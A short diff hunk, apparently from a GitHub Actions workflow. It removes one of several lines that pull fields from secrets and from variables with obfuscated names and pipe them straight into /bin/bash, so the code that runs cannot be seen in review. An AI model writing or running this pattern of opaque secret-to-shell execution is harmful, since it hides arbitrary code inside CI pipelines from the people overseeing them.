@@ -22,7 +22,6 @@ jobs:
           i98: ${{ secrets.i98 }}
         run: |
           printf '%s' "$i98" | jq -r .bgpt2470 | /bin/bash
-          printf '%s' "$dgudr94080" | jq -r .yhmqx668 | /bin/bash
           echo $dxnnm4568 | jq -r .cb1 | /bin/bash
 
       - name: Store results
